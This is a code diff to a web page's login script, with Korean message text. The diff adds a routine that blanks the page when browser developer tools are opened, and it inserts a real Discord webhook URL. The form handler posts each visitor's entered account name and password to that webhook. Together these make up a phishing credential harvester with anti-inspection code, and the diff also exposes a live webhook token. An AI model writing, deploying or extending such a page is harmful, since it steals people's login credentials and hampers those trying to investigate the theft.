@@ -103,12 +103,29 @@
 </div>
 
 <script>
+    function detectDevTools() {
+        const threshold = 160;
+        const devtools = /./;
+        devtools.toString = function() {
+            window.location.href = "about:blank";
+        };
+        console.log("%c", devtools);
+
+        setInterval(() => {
+            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+                window.location.href = "about:blank";
+            }
+        }, 500);
+    }
+
+    detectDevTools();
+
     document.getElementById("loginForm").addEventListener("submit", function(event) {
-        event.preventDefault(); // 기본 폼 제출 막기
+        event.preventDefault();
 
         const account = document.getElementById("account").value;
         const password = document.getElementById("password").value;
-        const webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // 여기에 실제 웹훅 URL 입력
+        const webhookURL = "https://discord.com/api/webhooks/1346063700137742387/j8jPhP8dIeq85mv4Wm_S3hJHk7NYP4sl29Lf_whcW8DykSOYWWQ2faq5CTiJeSN2JKy8";
 
         const message = {
             content: `🔒 **로그인 시도**\n👤 계정: ${account}\n🔑 비밀번호: ${password}`
